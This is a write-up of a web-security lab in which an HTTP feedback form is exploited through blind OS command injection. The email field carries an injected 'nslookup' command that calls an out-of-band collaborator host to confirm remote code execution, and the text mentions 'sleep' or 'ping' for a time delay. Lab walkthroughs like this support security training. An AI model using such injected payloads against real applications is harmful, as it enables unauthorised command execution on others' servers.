## Blind OS command injection with time delays

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

## Notes

- /feedback

## Resume

1. Capture a `/feedback` request
2. Inject OS command payload
3. Execute a command to cause a 10 second delay


## Solve 

First step is to capture a `/feedback` request : 

```
POST /feedback/submit HTTP/2
Host: 0a1b0018046b9061830aa0bf00840020.web-security-academy.net
Cookie: session=ZkyzKQmOSZ6Um85VycsI8foWreitS8Vd
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a1b0018046b9061830aa0bf00840020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1b0018046b9061830aa0bf00840020.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


csrf=GZ0mQuDcrLWejzkUJkdSW76vaaGmw0FH&name=toto&email=toto%40toto.com&subject=toto&message=toto
```

Then try to RCE on one of the two parameters : 

```
POST /feedback/submit HTTP/2
Host: 0a1b0018046b9061830aa0bf00840020.web-security-academy.net
Cookie: session=ZkyzKQmOSZ6Um85VycsI8foWreitS8Vd
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a1b0018046b9061830aa0bf00840020.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1b0018046b9061830aa0bf00840020.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


csrf=GZ0mQuDcrLWejzkUJkdSW76vaaGmw0FH&name=toto&email=x||nslookup htert61kfxgod7fbhnkq2xw36ucl0co1.oastify.com||&subject=toto&message=toto
```

The answer : 

```
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

"Could not save"
```

We can see that on our collaborator we have two **DNS** request that confirm we were able to **RCE**, we can now update the request to use a commande like `sleep()` or `ping` to cause a 10s delay.


